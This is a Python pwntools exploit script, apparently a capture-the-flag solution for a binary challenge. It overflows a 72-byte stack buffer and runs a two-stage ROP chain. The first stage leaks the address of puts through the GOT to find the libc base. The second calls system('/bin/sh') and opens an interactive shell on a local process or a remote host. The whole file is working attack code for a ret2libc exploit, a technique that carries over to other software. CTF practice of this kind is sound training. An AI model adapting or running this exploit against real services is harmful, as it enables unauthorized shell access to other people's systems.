#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './bee9f73f50d2487e911da791273ae5a3'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc.so'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    host, port = sys.argv[1].split(':')
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000400763 # pop rdi ; ret

# elf, libc
puts_got = elf.got['puts']
puts_plt = elf.symbols['puts']
main = 0x04006B8

# rop1
offset = 72
payload = 'A'*offset
payload += p64(prdi) + p64(puts_got) + p64(puts_plt) + p64(main)
payload = payload.ljust(200,'\0')

for i in payload:
    se(i)

ru('bye~\n')

puts = u64(rc(6).ljust(8,'\0'))
info_addr('puts',puts)
libc_base = puts - libc.symbols['puts']
system = libc.symbols['system'] + libc_base
binsh = libc.search('/bin/sh').next() + libc_base
info_addr('system', system)
info_addr('binsh', binsh)

# rop2
ppr = 0x0000000000400761 # pop rsi ; pop r15 ; ret

payload2 = 'B'*offset
payload2 += p64(ppr) + p64(0)*2
payload2 += p64(prdi) + p64(binsh) + p64(system) + p64(main)
payload2 = payload2.ljust(200,'\0')

# debug('b *0x4006b7')
for i in payload2:
    se(i)

# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()

